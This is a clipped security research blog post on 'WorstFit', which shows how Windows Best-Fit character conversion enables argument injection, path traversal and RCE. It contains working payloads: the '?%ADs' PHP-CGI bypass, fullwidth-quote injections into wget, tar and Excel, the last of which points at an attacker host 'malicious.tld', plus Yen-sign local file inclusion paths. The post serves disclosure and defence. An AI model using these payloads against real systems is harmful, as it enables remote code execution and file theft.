---
title: "WorstFit: Unveiling Hidden Transformers in Windows ANSI!"
source: https://devco.re/blog/2025/01/09/worstfit-unveiling-hidden-transformers-in-windows-ansi/
author:
  - DEVCORE
published:
created: 2026-01-03
description: The research unveils a new attack surface in Windows by exploiting Best-Fit, an internal charset conversion feature. Through our work, we successfully transformed this feature into several practical attacks, including Path Traversal, Argument Injection, and even RCE, affecting numerous well-known applications!
tags:
  - clippings/articles
  - Windows
---
# WorstFit: Unveiling Hidden Transformers in Windows ANSI!

![](https://devco.re/assets/img/blog/20250109/cover.jpeg)

> [!summary]
> > The \"WorstFit\" research by Orange Tsai and Splitline unveils a novel attack surface on Windows by exploiting \"Best-Fit\" character conversion, an internal feature that maps non-existent UTF-16 characters to \"closest\" ANSI equivalents based on the system's code page.
> This conversion, intended for backward compatibility, leads to unexpected transformations that can be leveraged for various attacks.
>
> The article outlines several attack techniques:
> *   **CVE-2024-4577 (The Nightmare of East-Asia)**: Exploits the soft hyphen (`U+00AD`) mapping to a dash (`-`) on East-Asian code pages to bypass PHP-CGI argument parsing protections, enabling RCE.
> *   **Filename Smuggling**: Uses characters that map to path separators (`/` or `\`, e.g., Yen `¥`, Won `₩`, fullwidth slashes) to achieve path traversal. A case study shows RCE on Cuckoo Sandbox due to Python 2.7's vulnerable filesystem handling.
> *   **Argument Splitting**: Leverages characters that map to double quotes (`\"`, e.g., fullwidth double quote `U+FF02`) or backslashes (`\`) to manipulate command-line arguments. This works because Windows passes the command line as a single string, and many applications use ANSI APIs (`GetCommandLineA` or `int main()`) for parsing, which triggers Best-Fit before argument sanitization. Case studies include RCE on ElFinder via Windows' built-in `tar.exe` and Microsoft Excel RCE (CVE-2024-49026) via \"Open-With\" functionality, combined with NTLM Relay.
> *   **Environment Variable Confusion**: Exploits `GetEnvironmentVariableA` or `getenv` returning Best-Fit versions of environment variables, leading to WAF bypasses (e.g., `à` to `a`) and Local File Inclusion (LFI) in PHP-CGI on IIS (using Yen `¥` for path manipulation).
>
> The researchers faced significant challenges reporting these issues, with many vendors (Curl, Perl, Microsoft) classifying them as Windows features or not their responsibility, highlighting the systemic nature of the problem. Microsoft eventually added a warning to `GetCommandLineA` documentation, and some CVEs were assigned.
>
> **Mitigations** suggest users enable Windows' beta UTF-8 feature (with caution) and developers prioritize using Wide Character APIs (`wchar_t`, `_wmain`, `_wgetcwd`, `_wgetenv`) to avoid implicit ANSI conversions, thus phasing out ANSI-dependent code.

The research unveils a new attack surface in Windows by exploiting **Best-Fit** (or Best Fit), an internal charset conversion feature. Through our work, we successfully transformed this feature into several practical attacks, including Path Traversal, Argument Injection, and even RCE, affecting numerous well-known applications!

Get the latest update and slides on our website!🔥 → [https://worst.fit/](https://worst.fit/)
Presentation: https://youtu.be/sKH8283CFzs?si=Qk9nHsI7haLTvDfk

Let’s imagine that: you’re a pentester, and your target website is running the following code. Can you pop a `calc.exe` with that?

```php
<?php
  $url = "https://example.tld/" . $_GET['path'] . ".txt";
  system("wget.exe -q " . escapeshellarg($url));
```

today, we would like to present a new technique to break through it!

## Decoding the Windows Encodings

If you are a Windows user, you’re probably aware that the Windows operating system supports Unicode. This means we can seamlessly put emojis ✅, áccènted letters, 𝒻𝒶𝓃𝒸𝓎 𝕤𝕪𝕞𝕓𝕠𝕝𝕤 and CJK 匚卄八尺八匚ㄒヨ尺丂 pretty much anywhere — like file names, file contents, or even environment variables. But have you ever wondered how Windows manages to handle those non-ASCII characters?

### The Early Days: ANSI and Code Pages

Windows initially used ANSI encoding, which relied on code pages such as the one shown below. It used 8 to 16 bits to represent a single character. While these mappings were effective for certain languages, they were unable to accommodate mixed or universal character sets.

| **Code Page** | **Language** |
| --- | --- |
| 1250 | Central / Eastern European languages (e.g., Polish, Czech) |
| 1251 | Cyrillic-based languages (e.g., Russian, Bulgarian) |
| 1252 | Western European languages (e.g., English, German, French) |
| 1253 | Greek |
| 1254 | Turkish |
| 1255 | Hebrew |
| 1256 | Arabic |
| 1257 | Baltic languages (e.g., Estonian, Latvian, Lithuanian) |
| 1258 | Vietnamese |
| 932 | Japanese |
| 936 | Simplified Chinese |
| 949 | Korean |
| 950 | Traditional Chinese |
| 874 | Thai |

To handle different encoding needs, Windows doesn’t rely on just one type of code page — there are actually two:

**ACP** (ANSI Code Page): Used for most applications and system settings, such as file operations or managing environment variables.

**OEMCP** (Original Equipment Manufacturer Code Page): Mainly used for device communication

To check which ACP (ANSI code page) you’re using

```powershell
powershell.exe [Console]::OutputEncoding.WindowsCodePage
```

```powershell
reg query HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Nls\CodePage /v ACP
```

### The Unicode Era: UTF-16

To address the limitations of code pages, Windows transitioned to Unicode in the mid-1990s. Unlike code pages, Unicode could represent characters from nearly all languages in a single standard.

Windows also switched to **wide characters** for core APIs like file systems, system information, and text processing.

### The Dual Era of Encoding

Even though Unicode became the backbone of Windows, Windows still needs to do what they always do: backward compatible. They still need to support the old ANSI code pages. To achieve this, Windows implemented two different versions of APIs:

- **ANSI APIs**: A Windows code page version with the letter “A” postfix used to indicate “ANSI”. For example, [`GetEnvironmentVariableA`](https://learn.microsoft.com/en-us/windows/win32/api/processenv/nf-processenv-getenvironmentvariablea) function.
- **Unicode APIs**: A Unicode version with the letter “W” postfix used to indicate “wide (character)”. For example, [`GetEnvironmentVariableW`](https://learn.microsoft.com/en-us/windows/win32/api/processenv/nf-processenv-getenvironmentvariablew) function.

But wait, so how can a wide character UTF-16 string also be in the ANSI format? Aren’t they fundamentally different?

To illustrate this, let’s explore an example. Imagine we’re on an English (**Windows-1252** code page) system with an environment variable `ENV=Hello` stored in the system. The data is internally stored as **UTF-16** (wide character format), but we can retrieve it using both Unicode and ANSI APIs:

- **Unicode API**: `GetEnvironmentVariableW(L"ENV")` ⭢ `L"Hello"` (Hex: `4800 6500 6C00 6C00 6F00` in UTF-16LE).

- **ANSI API**: `GetEnvironmentVariableA("ENV")` — `RtlUnicodeStringToAnsiString` ⭢ `"Hello"` (Hex: `48 65 6C 6C 6F` in ANSI).

For the **Unicode API**, there’s no problem—Unicode in, Unicode out, with no conversion needed. For the **ANSI API**, Windows applies an implicit conversion by calling [`RtlUnicodeStringToAnsiString`](https://learn.microsoft.com/en-us/windows/win32/api/winternl/nf-winternl-rtlunicodestringtoansistring) (or sometimes [`WideCharToMultiByte`](https://learn.microsoft.com/en-us/windows/win32/api/stringapiset/nf-stringapiset-widechartomultibyte)) to convert the original Unicode string to an ANSI string. Since `"Hello"` consists only of ASCII characters, everything works perfectly and as expected.

But what happens if the environment variable contains a more complex string, like **`√π⁷≤∞`**, with a lot of non-ASCII characters?

- **Unicode API**: `GetEnvironmentVariableW(L"ENV")` ⭢ `L"√π⁷≤∞"` (Hex: `1a22 c003 7720 6422 1e22` in UTF-16LE).

- **ANSI API**: `GetEnvironmentVariableA("ENV")` — `RtlUnicodeStringToAnsiString` ⭢ `"vp7=8"` (Hex: `76 70 37 3D 38` in ANSI) 🤯

This bizarre transformation is what’s known as **“Best-Fit”** behavior.

it’s not just when using Windows APIs directly — this behaviour also occurs when using non-wide-character version CRT (C runtime) functions like [`getenv`](https://learn.microsoft.com/en-us/cpp/c-runtime-library/reference/getenv-wgetenv). Surprisingly, even when you receive arguments or environment variables through a seemingly straightforward non-wide-character `main` function

We keep talking about Best-Fit, but how does this quirky behavior actually work in the end?

### It was the Best of Fit

In Windows, “Best-Fit” character conversion is a way the operating system handles situations where it needs to convert characters from UTF-16 to ANSI, but the exact character doesn’t exist in the target code page.

the `∞` ([U+221E](https://www.compart.com/en/unicode/U+221E)) symbol isn’t part of the [Windows-1252 code page](https://en.wikipedia.org/wiki/Windows-1252#Codepage_layout), so Microsoft decided to map it to the “ **closest** ” character— `8` ([🔍](https://worst.fit/mapping/#CP%3A1252%20FROM%3A0x221e)).

there’s no strict formula for Best-Fit mapping – what Microsoft does is more about making characters look, or even “feel” somewhat alike.

Also, different language configurations (code pages) handle mappings differently. For instance, the yen sign (`U+00A5`) is mapped to a backslash (`\`) on the Japanese (932) code page, to a “Y” on the Central European (1250) code page, and remains unchanged on most other code pages. This variability will play a significant role in how exploits behave across different system settings.

Now, it’s time to turn this quirky behaviour into something more impactful: **real WorstFit vulnerabilities**.

## It was the Worst of Fit – The novel attack surface on Windows

we can harness this unexpected character transformation as a brand-new attack surface on Windows systems. Here, we’ll explore three intriguing attack techniques that exploit this behavior: **Filename Smuggling**, **Argument Splitting** and **Environment Variable Confusion**.

### 🔥 The nightmare of East-Asia - CVE-2024-4577

The first ever WorstFit attack is CVE-2024-4577. This vulnerability allows attackers to compromise any PHP-CGI server configured with Chinese or Japanese code pages using nothing more than a `?%ADs` request!

Back in 2012, a vulnerability in PHP-CGI was discovered. The issue stemmed from Apache automatically treating the query string as the first argument for the CGI program. Exploitation was straightforward – argument injection. By appending `?-s` to a request, attackers could leak the page’s source code.

Of course, PHP quickly patched the issue. The fix was also simple: stop parsing arguments if the query string starts with a dash.

After some quick fuzzing, we discovered a simple bypass: appending `?%ADs` to the query string effortlessly!

As investigating more, we discovered that U+00AD (soft hyphen) is mapped to a dash (-) on Chinese (936, 950) and Japanese (932) code pages due to **Best-Fit** behavior, which explains how the bypass works.

### 🔥 Filename Smuggling

The next attack we would like to introduce is the WorstFit in the filename processing. Here, we focus on characters that mapped to either **”/” (0x2F)** or **”\\” (0x5C)**, such as the currency symbol [Yen (¥)](https://en.wikipedia.org/wiki/Won_sign), and [Won (₩)](https://en.wikipedia.org/wiki/Yen_and_yuan_sign) used in Japanese and Korean Code Pages, as well as the [fullwidth](https://en.wikipedia.org/wiki/Halfwidth_and_Fullwidth_Forms_\(Unicode_block\)) version of the (back-)slash in most Code Pages.

- [Characters mapped to “/” (0x2F)](https://worst.fit/mapping/#to%3A0x2f)

- [Characters mapped to “\\” (0x5C)](https://worst.fit/mapping/#to%3A0x5c)

In Chrome V8, the underlying implementation of its Developer Shell (`d8.exe`) uses the ANSI API `GetCurrentDirectoryA()` to obtain the current working directory. This means that if we can have a working directory with malicious Unicode characters, these characters will automatically be converted into path traversal payloads when accessed via the ANSI API. As a result, it leads to an unintended file access.

![](https://devco.re/assets/img/blog/20250109/4.png) *↑ Unintended file access on the `C:/windows/win.ini`:*

### 🔥 Argument Splitting

We can also exploit the WorstFit behavior in command line parsing by manipulating the output of `GetCommandLineA`. With this trick, even if you can control just a small part of an argument, that’s more than enough to inject as many arguments as you want!

This time, we’re zeroing in on characters that map to either a double quote (`"`, 0x22) or a backslash (`\`, 0x5C).

- [Characters mapped to `"` (0x22)](https://worst.fit/mapping/#to%3A0x22)

- [Characters mapped to `\` (0x5C)](https://worst.fit/mapping/#to%3A0x5c)

Let’s circle back to the piece of code we discussed earlier.

```php
<?php
  $url = "https://example.tld/" . $_GET['path'] . ".txt";
  system("wget.exe -q " . escapeshellarg($url));
```

The answer is quite simple. If an attacker provides the input: `＂ --use-askpass=calc ＂` It could pop **calc.exe** on the system!

is this wget’s problem? Well, spoiler alert: yes, it’s part of the issue, but it doesn’t stop there. The same trick works on other executables like **openssl.exe**, **tar.exe**, **java.exe**, and more CLI tools. This makes us realize, this can actually be a broader systemic issue with how argument handling works on Windows, creating an attack surface across various tools.

Let’s back to our payload `＂ --use-askpass=calc ＂`.

these aren’t just regular double quotes (`U+0022`) — they’re actually **fullwidth double quotes** (`U+FF02`) 😉. Thanks to the Best-Fit feature, in code pages like 125x and 874, fullwidth double quotes are automatically converted into standard double quotes ([🔍](https://worst.fit/mapping/#from%3A0xFF02%20to%3A0x22)).

But still, why can these double quotes alter the arguments?

![](https://devco.re/assets/img/blog/20250109/7.png)

Here’s a simple example.

![](https://devco.re/assets/img/blog/20250109/8.png)

The reason a normal `main` function becomes vulnerable lies in how the **C runtime (CRT)** handles command-line arguments. Even if you don’t explicitly call `GetCommandLineA`, once you use the `int main()` function, the compiler secretly generates a `mainCRTStartup` function inside your binary for you. This startup function is linked to the C runtime library (e.g., `ucrtbase.dll`), which internally retrieves the command line using an ANSI API and parses it for you. And that’s where the vulnerability creeps in.

![](https://devco.re/assets/img/blog/20250109/11.png)

This is why so many executables are exposed to WorstFit vulnerabilities.

However, only on 125x and 874 code pages does the fullwidth quotation mark (`U+FF02`) get converted into a normal double quote. So, what about CJK (Chinese, Japanese and Korean) languages? Are they safe now? Not entirely. Double quote is NOT the only character we can use for this attack!

As mentioned in the **Filename Smuggling** section, the Yen sign (`U+00A5`) on the Japanese (932) code page and the Won sign (`U+20A9`) on the Korean (949) code page are both converted into a **backslash (`\`)**.

As we’ve discussed, the backslash is crucial for escaping characters and altering the syntax of a command line.

This means it can be exploited to manipulate command execution.

Let’s take this Python code as an example:

```python
subprocess.run(['vuln.exe', 'foo¥" bar'])
```

After escaping, the command line should look like this:

```js
vuln.exe "foo¥\" bar"
```

Python prepends a backslash before the double quote to escape it. Everything seems fine, so Python passes this command line to the `CreateProcessW` API, and `vuln.exe` spawns successfully.

However, here’s where it gets tricky. The `vuln.exe` program uses an **ANSI API** to retrieve the command line. Thanks to the Best-Fit feature (again 😜), the Yen sign (`¥`) is converted into a backslash (`\`). Now, the command line seen by `vuln.exe` becomes:

vuln.exe "foo\\\\" bar"

#### ➤ Case Study 1 - ElFinder: RCE w/ Windows built-in GNU Tar

Here, one of our case studies highlights an RCE (Remote Code Execution) attack on [**ElFinder**](https://github.com/Studio-42/elFinder), caused by the WorstFit vulnerability in Windows’ `tar.exe` command.

ElFinder is a popular open-source, web-based file manager with a PHP backend.

One of the archive formats supported by ElFinder is the **tar** format. It uses the system’s built-in `tar.exe` command to create or extract archives. For example, if we create an archive named `foobar.tar` containing the files `foo.txt` and `bar.txt`, ElFinder would just execute the following command: `tar.exe -chf "foobar.tar" ".\foo.txt" ".\bar.txt"`

To exploit this, we can simply name the tar file as `aaa＂ ＂--use-compress-program=calc＂ ＂bbb.tar` (`＂` is `U+FF02`). This injects the `--use-compress-program` parameter, which allows arbitrary command execution. In our demonstration, this results in popping up `calc.exe`.

#### ➤ Case Study 3 - Microsoft Excel Remote Code Execution CVE-2024-49026

While re-mounting Argument Injection to applications, we discovered that the Argument Splitting attack can be combined with the “Open-With” feature to escalate its impact!

Windows actually maintains a handler table to know which program to use to open a file when you double-click a file. You can use `ftype` and `assoc` to see which programs handle specific file extensions.

![](https://devco.re/assets/img/blog/20250109/13.png)

We then discovered that the executable of Microsoft Excel is vulnerable to the Argument Splitting attack.

`．．／．．／．．／Windows／win.ini＂ ／n ＂＼＼malicious.tld@80＼pwn.xlsx`

By combining two tricks, we can trigger an Argument Injection on `Excel.exe` with just 1-Click.

### 🔥 Environment Variable Confusion

When functions like `GetEnvironmentVariableA`, `GetEnvironmentStringsA`, or `char *getenv(const char *varname)` are used, they return the **Best-Fit** version of the environment variable. This subtle behavior can be exploited to bypass character restrictions, creating potential opportunities for attackers to slip through otherwise secure validations and introduce security vulnerabilities.

For this exploit scenario, the environment variables must be user-controllable, which often occurs when a parent process needs to pass information to a spawned process.

A common example is in **CGI (Common Gateway Interface)**, where much of the HTTP request information—such as query strings, HTTP headers, and more—is passed through environment variables.

#### ➤ Case study 1 - WAF bypass

In some scenarios, a CGI script may act as a routing service. When this happens, the portion of the URL path after the CGI executable is stored in the environment variable `PATH_INFO`. A common use case might involve a developer trying to restrict remote access to sensitive endpoints, such as `/cgi.pl/admin` from the web server, instead of the CGI itself.

```js
<Directory "/var/www/cgi-bin">
    <If "%{REQUEST_URI} =~ m#/admin#">
        Require all denied
    </If>
</Directory>
```

However, due to the **WorstFit vulnerability** in Perl on Windows, this rule can be bypassed by substituting characters in `admin` with their **Best-Fit equivalents**. For instance, in **Code Page 1250**, the character `à` (`U+00E0`) is converted to `a` during the ANSI conversion.

By crafting a URL like `/cgi.pl/%E0dmin`, an attacker can bypass the Nginx rule, as the server interprets it as a different path, but Perl’s CGI script retrieves the `PATH_INFO` environment variable with ANSI API, and processes it as `/admin` after the Best-Fit conversion.

#### ➤ Case study 2 - PHP-CGI Local File Inclusion (LFI)

The previous example was hypothetical, but here’s a real-world case we discovered. In **PHP-CGI on Windows**, we identified a file existence check oracle and even a potential LFI (Local File Inclusion) vulnerability under certain configurations.

Imagine a request URI like this: `http://victim.tld/index.php/foo/bar`

After the web server (e.g., IIS, Apache, or another PHP-CGI-compatible server) processes it, it generates several environment variables. Depending on the server, these might look like this in Apache:

```bash
REDIRECT_URL=/index.php/foo/bar
REQUEST_URI=/index.php/foo/bar
PATH_INFO=/index.php/foo/bar
PATH_TRANSLATED=C:\inetpub\wwwroot\index.php\foo\bar
```

Notice how the PHP script filename (`index.php`) and the additional path (`foo/bar`) are combined. From the environment variables alone, it’s unclear which part represents the PHP file and which is additional `PATH_INFO`. Resolving this ambiguity is left to `php-cgi.exe`.

As we knew in the **Filename Smuggling** section, the Yen sign (`¥`) in the Japanese code page can be exploited. For example, by sending a request like `/index.php/..¥..¥windows/win.ini/foo`, you can potentially access arbitrary files.

- **Web Server’s Perspective**: The server treats the entire `/..¥..¥windows/win.ini/foo` as additional `PATH_INFO` and processes it as part of the request.

- **PHP-CGI’s Perspective**: PHP-CGI receives things like `REQUEST_URI=/index.php/..\..\windows/win.ini/foo` and struggles to differentiate between the actual PHP file (`index.php`) and the `PATH_INFO` portion. This confusion allows the exploit to manipulate the behavior and access files beyond intended restrictions.

But why stop at just checking file existence? On an **IIS server** with the `doc_root` directive configured, this can lead to **Local File Inclusion (LFI)**. Using a path like `/index.php/..¥..¥..¥windows/win.ini/`, you can effectively include and read arbitrary files, such as `C:\Windows\win.ini`.

![](https://devco.re/assets/img/blog/20250109/14.png)


